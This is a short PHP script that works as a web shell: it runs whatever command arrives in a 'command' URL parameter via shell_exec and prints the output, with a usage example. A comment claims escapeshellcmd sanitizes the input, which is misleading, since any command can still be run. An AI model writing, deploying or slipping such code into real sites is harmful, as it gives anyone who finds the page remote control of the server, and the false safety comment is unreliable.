<?php
if(isset($_GET['command'])) {
    // Get the command from the URL parameter
    $command = escapeshellcmd($_GET['command']);  // Sanitize the input to avoid code injection
    
    // Execute the command and display the output
    $output = shell_exec($command);
    
    echo "<pre>$output</pre>";  // Format the output for readability
} else {
    echo "Please provide a command to execute. Example: ?command=ls";
}
?>
